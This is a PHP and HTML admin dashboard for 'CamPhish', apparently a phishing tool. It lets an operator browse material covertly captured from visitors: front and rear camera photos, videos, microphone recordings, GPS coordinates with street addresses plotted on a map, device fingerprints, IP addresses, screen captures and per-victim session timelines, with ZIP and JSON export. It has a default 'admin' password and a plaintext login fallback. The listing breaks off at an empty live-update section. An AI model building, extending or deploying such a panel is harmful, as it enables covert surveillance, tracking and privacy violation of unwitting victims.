<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CamPhish — Admin Dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<style>
  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.4)}}
  @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
  @keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
  :root{
    --bg:#09090f;--panel:#12121c;--card:#18182a;--card2:#1e1e30;
    --border:#252535;--accent:#7c3aed;--accent2:#06b6d4;
    --green:#22c55e;--yellow:#f59e0b;--red:#ef4444;--pink:#f472b6;--orange:#fb923c;
    --text:#e2e8f0;--muted:#475569;--muted2:#64748b;
  }
  *{margin:0;padding:0;box-sizing:border-box;}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;}

  /* ── Sidebar ── */
  .sidebar{position:fixed;left:0;top:0;bottom:0;width:220px;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;z-index:100;}
  .sidebar-logo{padding:20px 18px;border-bottom:1px solid var(--border);}
  .sidebar-logo h1{font-size:1.1rem;font-weight:700;background:linear-gradient(90deg,#a78bfa,#38bdf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
  .sidebar-logo .ver{font-size:.7rem;color:var(--muted2);margin-top:2px;}
  .live-indicator{display:flex;align-items:center;gap:6px;padding:8px 18px;font-size:.75rem;color:var(--green);border-bottom:1px solid var(--border);}
  .live-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite;}
  nav{flex:1;padding:12px 0;overflow-y:auto;}
  nav a{display:flex;align-items:center;gap:10px;padding:10px 18px;font-size:.84rem;color:var(--muted2);text-decoration:none;border-left:3px solid transparent;transition:.15s;cursor:pointer;}
  nav a:hover,nav a.active{color:var(--text);background:rgba(124,58,237,.08);border-left-color:var(--accent);}
  nav a .icon{width:20px;text-align:center;}
  .sidebar-bottom{padding:14px 18px;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:8px;}
  .sidebar-bottom a{font-size:.78rem;color:var(--muted2);text-decoration:none;display:flex;align-items:center;gap:6px;padding:6px 8px;border-radius:6px;}
  .sidebar-bottom a:hover{background:rgba(255,255,255,.04);color:var(--text);}

  /* ── Main ── */
  .main{margin-left:220px;min-height:100vh;}
  .topbar{padding:16px 28px;background:var(--panel);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50;}
  .topbar h2{font-size:1rem;font-weight:600;}
  .topbar-right{display:flex;align-items:center;gap:10px;}
  .ts-badge{font-size:.72rem;color:var(--muted2);background:var(--card);border:1px solid var(--border);padding:4px 10px;border-radius:6px;font-family:'JetBrains Mono',monospace;}

  /* ── Buttons ── */
  .btn{padding:7px 14px;border:none;border-radius:7px;font-size:.78rem;cursor:pointer;font-family:'Inter',sans-serif;font-weight:500;transition:.15s;display:inline-flex;align-items:center;gap:5px;}
  .btn-primary{background:var(--accent);color:#fff;}.btn-primary:hover{background:#6d28d9;}
  .btn-danger{background:var(--red);color:#fff;}.btn-danger:hover{opacity:.85;}
  .btn-ghost{background:transparent;border:1px solid var(--border);color:var(--muted2);}.btn-ghost:hover{color:var(--text);border-color:var(--muted2);}
  .btn-green{background:#166534;color:#4ade80;border:1px solid #15803d;}.btn-green:hover{background:#14532d;}

  /* ── Section pages ── */
  .page{padding:24px 28px;display:none;animation:fadeIn .3s ease;}
  .page.active{display:block;}

  /* ── Stats grid ── */
  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;margin-bottom:24px;}
  .stat{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;position:relative;overflow:hidden;}
  .stat::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,currentColor,transparent);opacity:.04;pointer-events:none;}
  .stat .lbl{font-size:.7rem;color:var(--muted2);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;}
  .stat .val{font-size:2rem;font-weight:700;font-family:'JetBrains Mono',monospace;line-height:1;}
  .stat .diff{font-size:.7rem;margin-top:6px;color:var(--muted2);}
  .stat.c-purple{color:var(--accent);} .stat.c-cyan{color:var(--accent2);} .stat.c-green{color:var(--green);}
  .stat.c-pink{color:var(--pink);} .stat.c-orange{color:var(--orange);} .stat.c-yellow{color:var(--yellow);}

  /* ── Cards ── */
  .card{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:16px;}
  .card-header{background:var(--card2);padding:12px 16px;font-size:.83rem;font-weight:600;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border);}
  .card-header .count{margin-left:auto;background:rgba(124,58,237,.2);color:#a78bfa;padding:2px 8px;border-radius:20px;font-size:.7rem;}
  .card-body{padding:12px;}

  /* ── Photo grid ── */
  .photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(90px,1fr));gap:6px;padding:10px;}
  .photo-grid img,.photo-grid video{width:100%;aspect-ratio:1;object-fit:cover;border-radius:8px;border:1px solid var(--border);cursor:pointer;transition:.2s;}
  .photo-grid img:hover,.photo-grid video:hover{border-color:var(--accent);transform:scale(1.04);}

  /* ── List entries ── */
  .entry{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);font-size:.78rem;font-family:'JetBrains Mono',monospace;line-height:1.7;}
  .entry:last-child{border-bottom:none;}
  .entry a{color:var(--accent2);text-decoration:none;}.entry a:hover{text-decoration:underline;}
  .tag{display:inline-block;padding:1px 6px;border-radius:4px;font-size:.65rem;font-weight:700;margin-right:4px;text-transform:uppercase;}
  .tag.ip{background:#1e3a4a;color:var(--accent2);}
  .tag.gps{background:#1a3a1e;color:var(--green);}
  .tag.cam{background:#3a1e1e;color:#f87171;}
  .tag.dev{background:#3a2a1e;color:var(--yellow);}
  .tag.mic{background:#2a1e3a;color:#c084fc;}
  .tag.vid{background:#1e2a3a;color:#60a5fa;}
  .tag.scr{background:#1e3a30;color:#34d399;}
  .empty{padding:28px;text-align:center;color:var(--muted2);font-size:.83rem;}

  /* ── Map ── */
  #map{height:400px;border-radius:10px;overflow:hidden;}

  /* ── Timeline ── */
  .timeline{padding:14px;}
  .tl-item{display:flex;gap:12px;margin-bottom:14px;position:relative;}
  .tl-item::before{content:'';position:absolute;left:14px;top:28px;bottom:-14px;width:1px;background:var(--border);}
  .tl-item:last-child::before{display:none;}
  .tl-dot{width:28px;height:28px;border-radius:50%;background:var(--card2);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:.75rem;flex-shrink:0;}
  .tl-content{flex:1;}
  .tl-title{font-size:.82rem;font-weight:600;}
  .tl-sub{font-size:.74rem;color:var(--muted2);}

  /* ── Search / Filter ── */
  .filter-bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;}
  .search-input{flex:1;min-width:160px;background:var(--card2);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:.82rem;font-family:'Inter',sans-serif;}
  .search-input:focus{outline:none;border-color:var(--accent);}
  select.filter-select{background:var(--card2);border:1px solid var(--border);color:var(--text);padding:7px 10px;border-radius:8px;font-size:.82rem;font-family:'Inter',sans-serif;cursor:pointer;}

  /* ── Lightbox ── */
  .lightbox{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:1000;display:none;align-items:center;justify-content:center;padding:20px;}
  .lightbox.open{display:flex;}
  .lightbox img,.lightbox video{max-width:90vw;max-height:90vh;border-radius:12px;object-fit:contain;}
  .lightbox-close{position:absolute;top:20px;right:24px;font-size:1.8rem;cursor:pointer;color:#fff;background:none;border:none;}
  .lightbox-nav{position:absolute;top:50%;transform:translateY(-50%);background:rgba(255,255,255,.1);border:none;color:#fff;font-size:1.5rem;padding:12px;cursor:pointer;border-radius:8px;}
  .lightbox-nav.prev{left:12px;} .lightbox-nav.next{right:12px;}
  .lightbox-info{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);color:#fff;padding:6px 14px;border-radius:8px;font-size:.78rem;font-family:'JetBrains Mono',monospace;}

  /* ── Sessions ── */
  .session-card{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:12px 14px;margin-bottom:10px;cursor:pointer;transition:.15s;}
  .session-card:hover{border-color:var(--accent);background:rgba(124,58,237,.07);}
  .session-uuid{font-size:.7rem;font-family:'JetBrains Mono',monospace;color:var(--accent2);}
  .session-meta{font-size:.78rem;color:var(--muted2);margin-top:4px;}
  .session-tags{display:flex;gap:4px;margin-top:6px;flex-wrap:wrap;}

  /* ── Login ── */
  #loginWrap{display:flex;align-items:center;justify-content:center;height:100vh;background:var(--bg);}
  .login-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:36px;text-align:center;min-width:300px;}
  .login-box h2{font-size:1.2rem;margin-bottom:20px;}
  .login-input{width:100%;background:var(--panel);border:1px solid var(--border);color:var(--text);padding:11px 14px;border-radius:9px;font-size:.9rem;font-family:'Inter',sans-serif;margin-bottom:12px;}
  .login-input:focus{outline:none;border-color:var(--accent);}

  /* ── Responsive ── */
  @media(max-width:768px){
    .sidebar{width:60px;} .sidebar-logo span,.sidebar-logo .ver,nav a span,.sidebar-bottom a span{display:none;}
    nav a{padding:12px;justify-content:center;} .sidebar-logo h1{font-size:.7rem;}
    .main{margin-left:60px;} .stats{grid-template-columns:repeat(2,1fr);}
    .live-indicator span{display:none;}
  }
</style>
</head>
<body>
<?php
// ── Auth ──────────────────────────────────────────────────────────
$cfg = include __DIR__ . '/config.php';
$ADMIN_PASSWORD = $cfg['admin_password'] ?? 'admin';
session_start();
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pw']) && password_verify($_POST['pw'], password_hash($ADMIN_PASSWORD, PASSWORD_DEFAULT))) {
        $_SESSION['auth'] = true;
    } elseif (isset($_POST['pw']) && $_POST['pw'] === $ADMIN_PASSWORD) {
        $_SESSION['auth'] = true; // plain fallback
    } else {
        echo '<div id="loginWrap">
        <div class="login-box">
          <div style="font-size:2.5rem;margin-bottom:14px">🔐</div>
          <h2>CamPhish Admin</h2>
          <form method="POST">
            <input class="login-input" name="pw" type="password" placeholder="Password" autofocus>
            <button class="btn btn-primary" style="width:100%;padding:11px;font-size:.95rem;" type="submit">Login</button>
          </form>
        </div></div>';
        exit();
    }
}
if (isset($_GET['logout'])) { session_destroy(); header('Location: admin.php'); exit(); }

// ── Load data ─────────────────────────────────────────────────────
function glob_r($dir, $pattern) {
    if (!is_dir($dir)) return [];
    $f = glob($dir . '/' . $pattern) ?: [];
    rsort($f); return $f;
}
$snap_dir   = __DIR__ . '/logs/snapshots';
$screen_dir = __DIR__ . '/logs/screens';
$front_imgs = glob_r($snap_dir, 'cam_front_*.jpg');
$rear_imgs  = glob_r($snap_dir, 'cam_rear_*.jpg');
$videos     = glob_r($snap_dir, 'vid_*.webm');
$screens    = glob_r($screen_dir, 'screen_*.png');
$audio_files= glob_r(__DIR__ . '/logs/audio', 'mic_*.webm');
$loc_files  = glob_r(__DIR__ . '/logs/location', 'location_*.txt');
$dev_files  = glob_r(__DIR__ . '/logs/device', 'device_*.txt');
$ip_entries = file_exists(__DIR__ . '/logs/ip/saved.ip.txt')
    ? array_filter(explode("\n", file_get_contents(__DIR__ . '/logs/ip/saved.ip.txt')))
    : [];
// Sessions
$sessions = [];
$sess_dir = __DIR__ . '/logs/sessions';
if (is_dir($sess_dir)) {
    foreach (glob($sess_dir . '/*', GLOB_ONLYDIR) as $sdir) {
        $uuid = basename($sdir);
        $tl   = file_exists($sdir . '/timeline.log') ? file_get_contents($sdir . '/timeline.log') : '';
        $sessions[] = ['uuid' => $uuid, 'timeline' => $tl, 'dir' => $sdir];
    }
}
// GPS coords for map
$map_points = [];
foreach ($loc_files as $lf) {
    $c = file_get_contents($lf);
    preg_match('/Latitude: (.+)/', $c, $la);
    preg_match('/Longitude: (.+)/', $c, $lo);
    preg_match('/Google Maps: (.+)/', $c, $gm);
    preg_match('/Address: (.+)/', $c, $ad);
    if (isset($la[1], $lo[1])) {
        $map_points[] = ['lat'=>trim($la[1]),'lon'=>trim($lo[1]),'maps'=>trim($gm[1]??''),'addr'=>trim($ad[1]??'')];
    }
}
$total_visitors = count(array_filter($ip_entries, fn($l) => str_contains($l, 'IP:')));
$total_photos   = count($front_imgs) + count($rear_imgs);
?>

<!-- Lightbox -->
<div class="lightbox" id="lightbox">
  <button class="lightbox-close" onclick="closeLightbox()">✕</button>
  <button class="lightbox-nav prev" onclick="lbNav(-1)">‹</button>
  <img id="lbImg" src="" style="display:none">
  <video id="lbVid" controls style="display:none"></video>
  <button class="lightbox-nav next" onclick="lbNav(1)">›</button>
  <div class="lightbox-info" id="lbInfo"></div>
</div>

<!-- Sidebar -->
<div class="sidebar">
  <div class="sidebar-logo">
    <h1>⚡ CamPhish</h1>
    <div class="ver">v3.0 · Admin</div>
  </div>
  <div class="live-indicator">
    <div class="live-dot"></div>
    <span>LIVE</span>
  </div>
  <nav>
    <a class="active" onclick="showPage('overview')" id="nav-overview"><span class="icon">📊</span><span>Overview</span></a>
    <a onclick="showPage('photos')" id="nav-photos"><span class="icon">📸</span><span>Photos</span></a>
    <a onclick="showPage('videos')" id="nav-videos"><span class="icon">🎥</span><span>Videos</span></a>
    <a onclick="showPage('audio')" id="nav-audio"><span class="icon">🎙</span><span>Audio</span></a>
    <a onclick="showPage('location')" id="nav-location"><span class="icon">📍</span><span>Locations</span></a>
    <a onclick="showPage('devices')" id="nav-devices"><span class="icon">📱</span><span>Devices</span></a>
    <a onclick="showPage('visitors')" id="nav-visitors"><span class="icon">📡</span><span>Visitors</span></a>
    <a onclick="showPage('sessions')" id="nav-sessions"><span class="icon">🆔</span><span>Sessions</span></a>
    <a onclick="showPage('screens')" id="nav-screens"><span class="icon">🖥</span><span>Screens</span></a>
  </nav>
  <div class="sidebar-bottom">
    <a href="download_zip.php" target="_blank"><span>📦</span><span>Download ZIP</span></a>
    <a href="#" onclick="exportJSON()"><span>📋</span><span>Export JSON</span></a>
    <a href="?logout=1"><span>🚪</span><span>Logout</span></a>
  </div>
</div>

<!-- Main -->
<div class="main">
  <div class="topbar">
    <h2 id="pageTitle">Overview</h2>
    <div class="topbar-right">
      <div class="ts-badge" id="liveClock"><?= date('H:i:s') ?></div>
      <button class="btn btn-green" onclick="window.location.reload()">↻ Refresh</button>
    </div>
  </div>

  <!-- ═══ OVERVIEW PAGE ═══ -->
  <div class="page active" id="page-overview">
    <div class="stats">
      <div class="stat c-purple"><div class="lbl">Visitors</div><div class="val" id="st-visitors"><?= $total_visitors ?></div><div class="diff">Unique IPs</div></div>
      <div class="stat c-cyan"><div class="lbl">Locations</div><div class="val" id="st-locations"><?= count($loc_files) ?></div><div class="diff">GPS captures</div></div>
      <div class="stat c-pink"><div class="lbl">Photos</div><div class="val" id="st-photos"><?= $total_photos ?></div><div class="diff">Front + rear</div></div>
      <div class="stat c-green"><div class="lbl">Videos</div><div class="val"><?= count($videos) ?></div></div>
      <div class="stat c-orange"><div class="lbl">Audio</div><div class="val" id="st-audio"><?= count($audio_files) ?></div></div>
      <div class="stat c-yellow"><div class="lbl">Devices</div><div class="val"><?= count($dev_files) ?></div></div>
      <div class="stat c-cyan"><div class="lbl">Sessions</div><div class="val"><?= count($sessions) ?></div></div>
      <div class="stat" style="color:#34d399"><div class="lbl">Screens</div><div class="val" id="st-screens"><?= count($screens) ?></div></div>
    </div>

    <!-- Recent photos preview -->
    <div class="card">
      <div class="card-header">📸 Recent Captures <span class="count"><?= $total_photos ?></span></div>
      <div class="photo-grid">
        <?php foreach (array_slice(array_merge($front_imgs, $rear_imgs), 0, 16) as $img): ?>
          <img src="<?= htmlspecialchars($img) ?>" onclick="openLightbox('<?= htmlspecialchars($img) ?>', 'image')" title="<?= basename($img) ?>">
        <?php endforeach; ?>
        <?php if (!$front_imgs && !$rear_imgs): ?><div class="empty">No photos yet</div><?php endif; ?>
      </div>
    </div>

    <!-- Recent locations -->
    <div class="card">
      <div class="card-header">📍 Recent Locations <span class="count"><?= count($loc_files) ?></span></div>
      <?php foreach (array_slice($loc_files, 0, 5) as $lf):
        $c = file_get_contents($lf);
        preg_match('/Latitude: (.+)/', $c, $la); preg_match('/Longitude: (.+)/', $c, $lo);
        preg_match('/Google Maps: (.+)/', $c, $gm); preg_match('/Address: (.+)/', $c, $ad);
      ?>
      <div class="entry">
        <span class="tag gps">GPS</span>
        <?= htmlspecialchars(trim($la[1]??'?')) ?>, <?= htmlspecialchars(trim($lo[1]??'?')) ?>
        <?php if (!empty($ad[1])): ?><br><small style="color:var(--muted2)"><?= htmlspecialchars(trim($ad[1])) ?></small><?php endif; ?>
        <?php if (!empty($gm[1])): ?><br><a href="<?= htmlspecialchars(trim($gm[1])) ?>" target="_blank">🗺 Open Maps</a><?php endif; ?>
      </div>
      <?php endforeach; ?>
      <?php if (!$loc_files): ?><div class="empty">No locations yet</div><?php endif; ?>
    </div>
  </div>

  <!-- ═══ PHOTOS PAGE ═══ -->
  <div class="page" id="page-photos">
    <div class="filter-bar">
      <input class="search-input" type="text" placeholder="Search filename..." id="photo-search" oninput="filterPhotos()">
      <select class="filter-select" id="photo-cam" onchange="filterPhotos()">
        <option value="">All cameras</option>
        <option value="front">Front</option>
        <option value="rear">Rear</option>
      </select>
    </div>
    <div class="card">
      <div class="card-header">🤳 Front Camera <span class="count"><?= count($front_imgs) ?></span></div>
      <div class="photo-grid" id="grid-front">
        <?php foreach ($front_imgs as $img): ?>
          <img src="<?= htmlspecialchars($img) ?>" data-src="<?= htmlspecialchars($img) ?>" onclick="openLightbox('<?= htmlspecialchars($img) ?>', 'image')" title="<?= basename($img) ?>">
        <?php endforeach; ?>
        <?php if (!$front_imgs): ?><div class="empty">No front camera photos yet</div><?php endif; ?>
      </div>
    </div>
    <div class="card">
      <div class="card-header">📷 Rear Camera <span class="count"><?= count($rear_imgs) ?></span></div>
      <div class="photo-grid" id="grid-rear">
        <?php foreach ($rear_imgs as $img): ?>
          <img src="<?= htmlspecialchars($img) ?>" data-src="<?= htmlspecialchars($img) ?>" onclick="openLightbox('<?= htmlspecialchars($img) ?>', 'image')" title="<?= basename($img) ?>">
        <?php endforeach; ?>
        <?php if (!$rear_imgs): ?><div class="empty">No rear camera photos yet</div><?php endif; ?>
      </div>
    </div>
  </div>

  <!-- ═══ VIDEOS PAGE ═══ -->
  <div class="page" id="page-videos">
    <div class="card">
      <div class="card-header">🎥 Video Clips <span class="count"><?= count($videos) ?></span></div>
      <div class="photo-grid">
        <?php foreach ($videos as $vid): ?>
          <video src="<?= htmlspecialchars($vid) ?>" onclick="openLightbox('<?= htmlspecialchars($vid) ?>', 'video')" muted preload="metadata" title="<?= basename($vid) ?>"></video>
        <?php endforeach; ?>
        <?php if (!$videos): ?><div class="empty">No videos yet</div><?php endif; ?>
      </div>
    </div>
  </div>

  <!-- ═══ AUDIO PAGE ═══ -->
  <div class="page" id="page-audio">
    <div class="card">
      <div class="card-header">🎙 Audio Recordings <span class="count"><?= count($audio_files) ?></span></div>
      <div class="card-body">
        <?php foreach ($audio_files as $af): ?>
          <div style="display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);">
            <span class="tag mic">MIC</span>
            <span style="font-size:.78rem;font-family:'JetBrains Mono',monospace;color:var(--muted2)"><?= basename($af) ?></span>
            <audio controls src="<?= htmlspecialchars($af) ?>" style="flex:1;height:32px;"></audio>
            <a href="<?= htmlspecialchars($af) ?>" download class="btn btn-ghost" style="font-size:.7rem;">↓</a>
          </div>
        <?php endforeach; ?>
        <?php if (!$audio_files): ?><div class="empty">No audio recordings yet</div><?php endif; ?>
      </div>
    </div>
  </div>

  <!-- ═══ LOCATION PAGE ═══ -->
  <div class="page" id="page-location">
    <div class="card">
      <div class="card-header">🗺 Location Map</div>
      <div class="card-body"><div id="map"></div></div>
    </div>
    <div class="card">
      <div class="card-header">📍 All Captured Locations <span class="count"><?= count($loc_files) ?></span></div>
      <?php foreach ($loc_files as $lf):
        $c = file_get_contents($lf);
        preg_match('/Latitude: (.+)/', $c, $la); preg_match('/Longitude: (.+)/', $c, $lo);
        preg_match('/Accuracy: (.+)/', $c, $ac); preg_match('/Google Maps: (.+)/', $c, $gm);
        preg_match('/Address: (.+)/', $c, $ad); preg_match('/Speed: (.+)/', $c, $sp);
        preg_match('/Heading: (.+)/', $c, $he); preg_match('/Altitude: (.+)/', $c, $alt);
        preg_match('/UUID: (.+)/', $c, $uu);
      ?>
      <div class="entry">
        <span class="tag gps">GPS</span>
        <strong><?= htmlspecialchars(trim($la[1]??'?')) ?>, <?= htmlspecialchars(trim($lo[1]??'?')) ?></strong>
        <span style="color:var(--muted2)"> ±<?= htmlspecialchars(trim($ac[1]??'?')) ?></span>
        <?php if (!empty($ad[1])): ?><br>🏠 <?= htmlspecialchars(trim($ad[1])) ?><?php endif; ?>
        <?php if (!empty($alt[1])): ?><br>⬆ Altitude: <?= htmlspecialchars(trim($alt[1])) ?><?php endif; ?>
        <?php if (!empty($sp[1])): ?>&nbsp;💨 Speed: <?= htmlspecialchars(trim($sp[1])) ?><?php endif; ?>
        <?php if (!empty($he[1])): ?>&nbsp;🧭 <?= htmlspecialchars(trim($he[1])) ?><?php endif; ?>
        <?php if (!empty($uu[1])): ?><br>🆔 <?= htmlspecialchars(trim($uu[1])) ?><?php endif; ?>
        <?php if (!empty($gm[1])): ?><br><a href="<?= htmlspecialchars(trim($gm[1])) ?>" target="_blank">🗺 Open in Google Maps</a><?php endif; ?>
      </div>
      <?php endforeach; ?>
      <?php if (!$loc_files): ?><div class="empty">No locations captured yet</div><?php endif; ?>
    </div>
  </div>

  <!-- ═══ DEVICES PAGE ═══ -->
  <div class="page" id="page-devices">
    <div class="filter-bar">
      <input class="search-input" type="text" placeholder="Search device info..." id="dev-search" oninput="filterDevices()">
    </div>
    <div class="card" id="dev-card">
      <div class="card-header">📱 Device Fingerprints <span class="count"><?= count($dev_files) ?></span></div>
      <?php foreach ($dev_files as $df): ?>
        <div class="entry dev-entry">
          <span class="tag dev">DEVICE</span>
          <pre style="font-size:.7rem;white-space:pre-wrap;color:#94a3b8;margin-top:4px"><?= htmlspecialchars(file_get_contents($df)) ?></pre>
        </div>
      <?php endforeach; ?>
      <?php if (!$dev_files): ?><div class="empty">No device data yet</div><?php endif; ?>
    </div>
  </div>

  <!-- ═══ VISITORS PAGE ═══ -->
  <div class="page" id="page-visitors">
    <div class="filter-bar">
      <input class="search-input" type="text" placeholder="Filter by IP..." id="ip-search" oninput="filterVisitors()">
    </div>
    <div class="card">
      <div class="card-header">📡 Visitor IPs <span class="count"><?= $total_visitors ?></span></div>
      <?php
      $shown = 0;
      foreach (array_reverse(array_values(array_filter($ip_entries))) as $line):
        if ($shown++ > 50) break;
        if (trim($line) === '') continue;
      ?>
        <div class="entry visitor-entry"><?= htmlspecialchars(trim($line)) ?></div>
      <?php endforeach; ?>
      <?php if (!$ip_entries): ?><div class="empty">No visitors yet</div><?php endif; ?>
    </div>
  </div>

  <!-- ═══ SESSIONS PAGE ═══ -->
  <div class="page" id="page-sessions">
    <div class="card">
      <div class="card-header">🆔 Active Sessions <span class="count"><?= count($sessions) ?></span></div>
      <div class="card-body">
        <?php foreach ($sessions as $sess):
          $lines = array_filter(explode("\n", $sess['timeline']));
          $last  = end($lines);
          $types = array_unique(array_map(fn($l) => preg_match('/\] ([A-Z]+)/', $l, $m) ? $m[1] : '', $lines));
        ?>
        <div class="session-card" onclick="showTimeline('<?= htmlspecialchars($sess['uuid']) ?>', <?= htmlspecialchars(json_encode($sess['timeline'])) ?>)">
          <div class="session-uuid"><?= htmlspecialchars($sess['uuid']) ?></div>
          <div class="session-meta"><?= count($lines) ?> events · last: <?= htmlspecialchars($last ?: 'none') ?></div>
          <div class="session-tags">
            <?php foreach (array_filter($types) as $t): ?>
              <span class="tag <?= strtolower($t) ?>"><?= htmlspecialchars($t) ?></span>
            <?php endforeach; ?>
          </div>
        </div>
        <?php endforeach; ?>
        <?php if (!$sessions): ?><div class="empty">No sessions yet</div><?php endif; ?>
      </div>
    </div>
    <!-- Session timeline detail -->
    <div class="card" id="timeline-detail" style="display:none">
      <div class="card-header">⏱ Session Timeline</div>
      <div class="timeline" id="timeline-body"></div>
    </div>
  </div>

  <!-- ═══ SCREENS PAGE ═══ -->
  <div class="page" id="page-screens">
    <div class="card">
      <div class="card-header">🖥 Screen Captures <span class="count"><?= count($screens) ?></span></div>
      <div class="photo-grid">
        <?php foreach ($screens as $sc): ?>
          <img src="<?= htmlspecialchars($sc) ?>" onclick="openLightbox('<?= htmlspecialchars($sc) ?>', 'image')" title="<?= basename($sc) ?>">
        <?php endforeach; ?>
        <?php if (!$screens): ?><div class="empty">No screen captures yet</div><?php endif; ?>
      </div>
    </div>
  </div>

</div><!-- /main -->

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
// ── Clock ─────────────────────────────────────────────────────────
setInterval(() => {
  document.getElementById('liveClock').textContent = new Date().toLocaleTimeString();
}, 1000);

// ── Navigation ────────────────────────────────────────────────────
const pageTitles = {
  overview:'Overview', photos:'Photos', videos:'Videos', audio:'Audio',
  location:'Locations', devices:'Devices', visitors:'Visitors', sessions:'Sessions', screens:'Screens'
};
function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
  document.getElementById('page-' + id).classList.add('active');
  document.getElementById('nav-' + id).classList.add('active');
  document.getElementById('pageTitle').textContent = pageTitles[id] || id;
  if (id === 'location') initMap();
}

// ── Leaflet Map ───────────────────────────────────────────────────
let mapInitialized = false;
function initMap() {
  if (mapInitialized) return;
  mapInitialized = true;
  const points = <?= json_encode($map_points) ?>;
  const map = L.map('map').setView([20, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap contributors', maxZoom: 19
  }).addTo(map);
  points.forEach(p => {
    const marker = L.marker([p.lat, p.lon]).addTo(map);
    const popup = `<b>📍 GPS</b><br>Lat: ${p.lat}<br>Lon: ${p.lon}` +
      (p.addr ? `<br>Address: ${p.addr}` : '') +
      (p.maps ? `<br><a href="${p.maps}" target="_blank">Open Maps</a>` : '');
    marker.bindPopup(popup);
  });
  if (points.length > 0) {
    map.fitBounds(points.map(p => [p.lat, p.lon]), {padding:[40,40]});
  }
}

// ── Lightbox ──────────────────────────────────────────────────────
let lbImages = [], lbIdx = 0;
function openLightbox(src, type) {
  const lb = document.getElementById('lightbox');
  const img = document.getElementById('lbImg');
  const vid = document.getElementById('lbVid');
  lb.classList.add('open');
  if (type === 'image') {
    img.src = src; img.style.display = 'block'; vid.style.display = 'none';
  } else {
    vid.src = src; vid.style.display = 'block'; img.style.display = 'none';
  }
  document.getElementById('lbInfo').textContent = src.split('/').pop();
  // Build image list for navigation
  lbImages = Array.from(document.querySelectorAll('.photo-grid img')).map(el => el.src);
  lbIdx    = lbImages.indexOf(src);
}
function closeLightbox() { document.getElementById('lightbox').classList.remove('open'); }
function lbNav(dir) {
  lbIdx = (lbIdx + dir + lbImages.length) % lbImages.length;
  document.getElementById('lbImg').src = lbImages[lbIdx];
  document.getElementById('lbInfo').textContent = lbImages[lbIdx].split('/').pop();
}
document.getElementById('lightbox').addEventListener('click', function(e) {
  if (e.target === this) closeLightbox();
});
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') closeLightbox();
  if (e.key === 'ArrowRight') lbNav(1);
  if (e.key === 'ArrowLeft') lbNav(-1);
});

// ── Filters ───────────────────────────────────────────────────────
function filterPhotos() {
  const q = document.getElementById('photo-search').value.toLowerCase();
  const cam = document.getElementById('photo-cam').value;
  document.querySelectorAll('#grid-front img, #grid-rear img').forEach(img => {
    const src = img.src.toLowerCase();
    const nameMatch = !q || src.includes(q);
    const camMatch  = !cam || src.includes('cam_' + cam);
    img.style.display = (nameMatch && camMatch) ? '' : 'none';
  });
}
function filterDevices() {
  const q = document.getElementById('dev-search').value.toLowerCase();
  document.querySelectorAll('.dev-entry').forEach(el => {
    el.style.display = !q || el.textContent.toLowerCase().includes(q) ? '' : 'none';
  });
}
function filterVisitors() {
  const q = document.getElementById('ip-search').value.toLowerCase();
  document.querySelectorAll('.visitor-entry').forEach(el => {
    el.style.display = !q || el.textContent.toLowerCase().includes(q) ? '' : 'none';
  });
}

// ── Session Timeline ──────────────────────────────────────────────
function showTimeline(uuid, raw) {
  const detail = document.getElementById('timeline-detail');
  const body   = document.getElementById('timeline-body');
  detail.style.display = 'block';
  const icons = { VISIT:'🎯', LOCATION:'📍', PHOTO:'📸', DEVICE:'📱', AUDIO:'🎙', VIDEO:'🎥', SCREEN:'🖥' };
  const lines = raw.trim().split('\n').filter(l => l);
  body.innerHTML = lines.map(line => {
    const m = line.match(/\[(.+?)\] ([A-Z]+) \| (.+)/);
    if (!m) return `<div class="tl-item"><div class="tl-dot">📋</div><div class="tl-content"><div class="tl-title">${line}</div></div></div>`;
    const [,ts, type, info] = m;
    return `<div class="tl-item">
      <div class="tl-dot">${icons[type]||'📋'}</div>
      <div class="tl-content">
        <div class="tl-title">${type}</div>
        <div class="tl-sub">${ts} · ${info}</div>
      </div>
    </div>`;
  }).join('') || '<div class="empty">No events</div>';
  detail.scrollIntoView({behavior:'smooth'});
}

// ── SSE Live Updates ──────────────────────────────────────────────
